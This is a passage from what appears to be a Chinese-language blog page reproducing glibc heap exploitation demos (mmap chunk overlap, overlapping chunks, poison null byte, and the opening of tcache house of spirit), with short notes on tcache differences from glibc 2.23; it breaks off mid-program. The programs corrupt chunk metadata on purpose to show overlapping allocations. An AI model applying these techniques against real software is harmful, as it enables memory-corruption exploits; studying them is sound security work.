<span class="token string">"....\n"</span> \
<span class="token string">"third mmap chunk\n"</span> \
<span class="token string">"second mmap chunk\n"</span> \
<span class="token string">"LibC\n"</span> \
<span class="token string">"....\n"</span> \
<span class="token string">"ld\n"</span> \
<span class="token string">"first mmap chunk\n"</span>
<span class="token string">"===============================================\n\n"</span> \
<span class="token punctuation">)</span><span class="token punctuation">;</span>
	
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Prev Size of third mmap chunk: 0x%llx\n"</span><span class="token punctuation">,</span> mmap_chunk_3<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Size of third mmap chunk: 0x%llx\n\n"</span><span class="token punctuation">,</span> mmap_chunk_3<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Change the size of the third mmap chunk to overlap with the second mmap chunk\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>	
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"This will cause both chunks to be Munmapped and given back to the system\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"This is where the vulnerability occurs; corrupting the size or prev_size of a chunk\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	mmap_chunk_3<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">0xFFFFFFFFFD</span> <span class="token operator">&amp;</span> mmap_chunk_3<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token number">0xFFFFFFFFFD</span> <span class="token operator">&amp;</span> mmap_chunk_2<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token number">2</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"New size of third mmap chunk: 0x%llx\n"</span><span class="token punctuation">,</span> mmap_chunk_3<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Free the third mmap chunk, which munmaps the second and third chunks\n\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token function">free</span><span class="token punctuation">(</span>mmap_chunk_3<span class="token punctuation">)</span><span class="token punctuation">;</span> 

	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Get a very large chunk from malloc to get mmapped chunk\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"This should overlap over the previously munmapped/freed chunks\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">long</span> <span class="token keyword">long</span><span class="token operator">*</span> overlapping_chunk <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x300000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Overlapped chunk Ptr: %p\n"</span><span class="token punctuation">,</span> overlapping_chunk<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Overlapped chunk Ptr Size: 0x%llx\n"</span><span class="token punctuation">,</span> overlapping_chunk<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">// Gets the distance between the two pointers.</span>
	<span class="token keyword">int</span> distance <span class="token operator">=</span> mmap_chunk_2 <span class="token operator">-</span> overlapping_chunk<span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Distance between new chunk and the second mmap chunk (which was munmapped): 0x%x\n"</span><span class="token punctuation">,</span> distance<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Value of index 0 of mmap chunk 2 prior to write: %llx\n"</span><span class="token punctuation">,</span> mmap_chunk_2<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	
	<span class="token comment">// Set the value of the overlapped chunk.</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Setting the value of the overlapped chunk\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	overlapping_chunk<span class="token punctuation">[</span>distance<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x1122334455667788</span><span class="token punctuation">;</span>

	<span class="token comment">// Show that the pointer has been written to.</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Second chunk value (after write): 0x%llx\n"</span><span class="token punctuation">,</span> mmap_chunk_2<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Overlapped chunk value: 0x%llx\n\n"</span><span class="token punctuation">,</span> overlapping_chunk<span class="token punctuation">[</span>distance<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Boom! The new chunk has been overlapped with a previous mmaped chunk\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">assert</span><span class="token punctuation">(</span>mmap_chunk_2<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> overlapping_chunk<span class="token punctuation">[</span>distance<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<p>与2.23一致</p>
<h3 id="overlapping-chunks-c"><a href="#overlapping-chunks-c" class="headerlink" title="overlapping_chunks.c"></a>overlapping_chunks.c</h3><pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdint.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;assert.h></span></span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc <span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
	<span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>


	<span class="token class-name">intptr_t</span> <span class="token operator">*</span>p1<span class="token punctuation">,</span><span class="token operator">*</span>p2<span class="token punctuation">,</span><span class="token operator">*</span>p3<span class="token punctuation">,</span><span class="token operator">*</span>p4<span class="token punctuation">;</span>

	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nThis is a simple chunks overlapping problem\n\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Let's start to allocate 3 chunks on the heap\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	p1 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x500</span> <span class="token operator">-</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	p2 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x500</span> <span class="token operator">-</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	p3 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x80</span> <span class="token operator">-</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"The 3 chunks have been allocated here:\np1=%p\np2=%p\np3=%p\n"</span><span class="token punctuation">,</span> p1<span class="token punctuation">,</span> p2<span class="token punctuation">,</span> p3<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token function">memset</span><span class="token punctuation">(</span>p1<span class="token punctuation">,</span> <span class="token char">'1'</span><span class="token punctuation">,</span> <span class="token number">0x500</span> <span class="token operator">-</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">memset</span><span class="token punctuation">(</span>p2<span class="token punctuation">,</span> <span class="token char">'2'</span><span class="token punctuation">,</span> <span class="token number">0x500</span> <span class="token operator">-</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">memset</span><span class="token punctuation">(</span>p3<span class="token punctuation">,</span> <span class="token char">'3'</span><span class="token punctuation">,</span> <span class="token number">0x80</span> <span class="token operator">-</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nNow let's free the chunk p2\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">free</span><span class="token punctuation">(</span>p2<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token keyword">int</span> evil_chunk_size <span class="token operator">=</span> <span class="token number">0x581</span><span class="token punctuation">;</span>
	<span class="token keyword">int</span> evil_region_size <span class="token operator">=</span> <span class="token number">0x580</span> <span class="token operator">-</span> <span class="token number">8</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"We are going to set the size of chunk p2 to to %d, which gives us\na region size of %d\n"</span><span class="token punctuation">,</span>
		 evil_chunk_size<span class="token punctuation">,</span> evil_region_size<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">/* VULNERABILITY */</span>
	<span class="token operator">*</span><span class="token punctuation">(</span>p2<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">=</span> evil_chunk_size<span class="token punctuation">;</span> <span class="token comment">// we are overwriting the "size" field of chunk p2</span>
	<span class="token comment">/* VULNERABILITY */</span>

	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nNow let's allocate another chunk with a size equal to the data\n"</span>
	       <span class="token string">"size of the chunk p2 injected size\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"This malloc will be served from the previously freed chunk that\n"</span>
	       <span class="token string">"is parked in the unsorted bin which size has been modified by us\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	p4 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span>evil_region_size<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\np4 has been allocated at %p and ends at %p\n"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>p4<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>p4<span class="token operator">+</span>evil_region_size<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"p3 starts at %p and ends at %p\n"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>p3<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>p3<span class="token operator">+</span><span class="token number">0x580</span><span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"p4 should overlap with p3, in this case p4 includes all p3.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nNow everything copied inside chunk p4 can overwrites data on\nchunk p3,"</span>
		<span class="token string">" and data written to chunk p3 can overwrite data\nstored in the p4 chunk.\n\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Let's run through an example. Right now, we have:\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"p4 = %s\n"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>p4<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"p3 = %s\n"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>p3<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nIf we memset(p4, '4', %d), we have:\n"</span><span class="token punctuation">,</span> evil_region_size<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">memset</span><span class="token punctuation">(</span>p4<span class="token punctuation">,</span> <span class="token char">'4'</span><span class="token punctuation">,</span> evil_region_size<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"p4 = %s\n"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>p4<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"p3 = %s\n"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>p3<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nAnd if we then memset(p3, '3', 80), we have:\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">memset</span><span class="token punctuation">(</span>p3<span class="token punctuation">,</span> <span class="token char">'3'</span><span class="token punctuation">,</span> <span class="token number">80</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"p4 = %s\n"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>p4<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"p3 = %s\n"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>p3<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token function">assert</span><span class="token punctuation">(</span><span class="token function">strstr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>p4<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>p3<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<p>与2.23的区别为申请的chunk要增大&#x3D;&#x3D;》绕过tcache</p>
<h3 id="poison-null-byte-c"><a href="#poison-null-byte-c" class="headerlink" title="poison_null_byte.c"></a>poison_null_byte.c</h3><pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdint.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;malloc.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;assert.h></span></span>


<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
	<span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Welcome to poison null byte 2.0!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Tested in Ubuntu 18.04 64bit.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"This technique can be used when you have an off-by-one into a malloc'ed region with a null byte.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token class-name">uint8_t</span><span class="token operator">*</span> a<span class="token punctuation">;</span>
	<span class="token class-name">uint8_t</span><span class="token operator">*</span> b<span class="token punctuation">;</span>
	<span class="token class-name">uint8_t</span><span class="token operator">*</span> c<span class="token punctuation">;</span>
	<span class="token class-name">uint8_t</span><span class="token operator">*</span> b1<span class="token punctuation">;</span>
	<span class="token class-name">uint8_t</span><span class="token operator">*</span> b2<span class="token punctuation">;</span>
	<span class="token class-name">uint8_t</span><span class="token operator">*</span> d<span class="token punctuation">;</span>
	<span class="token keyword">void</span> <span class="token operator">*</span>barrier<span class="token punctuation">;</span>

	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"We allocate 0x500 bytes for 'a'.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	a <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">uint8_t</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x500</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"a: %p\n"</span><span class="token punctuation">,</span> a<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">int</span> real_a_size <span class="token operator">=</span> <span class="token function">malloc_usable_size</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Since we want to overflow 'a', we need to know the 'real' size of 'a' "</span>
		<span class="token string">"(it may be more than 0x500 because of rounding): %#x\n"</span><span class="token punctuation">,</span> real_a_size<span class="token punctuation">)</span><span class="token punctuation">;</span>

	b <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">uint8_t</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0xa00</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"b: %p\n"</span><span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">;</span>

	c <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">uint8_t</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x500</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"c: %p\n"</span><span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token punctuation">;</span>

	barrier <span class="token operator">=</span>  <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"We allocate a barrier at %p, so that c is not consolidated with the top-chunk when freed.\n"</span>
		<span class="token string">"The barrier is not strictly necessary, but makes things less confusing\n"</span><span class="token punctuation">,</span> barrier<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token class-name">uint64_t</span><span class="token operator">*</span> b_size_ptr <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">uint64_t</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>b <span class="token operator">-</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">size_t</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>b<span class="token operator">+</span><span class="token number">0x9f0</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0xa00</span><span class="token punctuation">;</span>

	<span class="token function">free</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span>
	
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"b.size: %#lx\n"</span><span class="token punctuation">,</span> <span class="token operator">*</span>b_size_ptr<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"b.size is: (0xa00 + 0x10) | prev_in_use\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"We overflow 'a' with a single null byte into the metadata of 'b'\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	a<span class="token punctuation">[</span>real_a_size<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token comment">// &lt;--- THIS IS THE "EXPLOITED BUG"</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"b.size: %#lx\n"</span><span class="token punctuation">,</span> <span class="token operator">*</span>b_size_ptr<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token class-name">uint64_t</span><span class="token operator">*</span> c_prev_size_ptr <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">uint64_t</span><span class="token operator">*</span><span class="token punctuation">)</span>c<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"c.prev_size is %#lx\n"</span><span class="token punctuation">,</span><span class="token operator">*</span>c_prev_size_ptr<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"We will pass the check since chunksize(P) == %#lx == %#lx == prev_size (next_chunk(P))\n"</span><span class="token punctuation">,</span>
		<span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">size_t</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>b<span class="token operator">-</span><span class="token number">0x8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">size_t</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>b<span class="token operator">-</span><span class="token number">0x10</span> <span class="token operator">+</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">size_t</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>b<span class="token operator">-</span><span class="token number">0x8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	b1 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x500</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"b1: %p\n"</span><span class="token punctuation">,</span>b1<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Now we malloc 'b1'. It will be placed where 'b' was. "</span>
		<span class="token string">"At this point c.prev_size should have been updated, but it was not: %#lx\n"</span><span class="token punctuation">,</span><span class="token operator">*</span>c_prev_size_ptr<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Interestingly, the updated value of c.prev_size has been written 0x10 bytes "</span>
		<span class="token string">"before c.prev_size: %lx\n"</span><span class="token punctuation">,</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">uint64_t</span><span class="token operator">*</span><span class="token punctuation">)</span>c<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"We malloc 'b2', our 'victim' chunk.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token comment">// Typically b2 (the victim) will be a structure with valuable pointers that we want to control</span>

	b2 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x480</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"b2: %p\n"</span><span class="token punctuation">,</span>b2<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token function">memset</span><span class="token punctuation">(</span>b2<span class="token punctuation">,</span><span class="token char">'B'</span><span class="token punctuation">,</span><span class="token number">0x480</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Current b2 content:\n%s\n"</span><span class="token punctuation">,</span>b2<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Now we free 'b1' and 'c': this will consolidate the chunks 'b1' and 'c' (forgetting about 'b2').\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token function">free</span><span class="token punctuation">(</span>b1<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">free</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">;</span>
	
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Finally, we allocate 'd', overlapping 'b2'.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	d <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0xc00</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"d: %p\n"</span><span class="token punctuation">,</span>d<span class="token punctuation">)</span><span class="token punctuation">;</span>
	
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Now 'd' and 'b2' overlap.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">memset</span><span class="token punctuation">(</span>d<span class="token punctuation">,</span><span class="token char">'D'</span><span class="token punctuation">,</span><span class="token number">0xc00</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"New b2 content:\n%s\n"</span><span class="token punctuation">,</span>b2<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Thanks to https://www.contextis.com/resources/white-papers/glibc-adventures-the-forgotten-chunks"</span>
		<span class="token string">"for the clear explanation of this technique.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token function">assert</span><span class="token punctuation">(</span><span class="token function">strstr</span><span class="token punctuation">(</span>b2<span class="token punctuation">,</span> <span class="token string">"DDDDDDDDDDDD"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<p>与2.23的区别为申请的chunk要增大&#x3D;&#x3D;》绕过tcache</p>
<h3 id="tcache-house-of-spirit-c"><a href="#tcache-house-of-spirit-c" class="headerlink" title="tcache_house_of_spirit.c"></a>tcache_house_of_spirit.c</h3><pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;assert.h></span></span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
	<span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

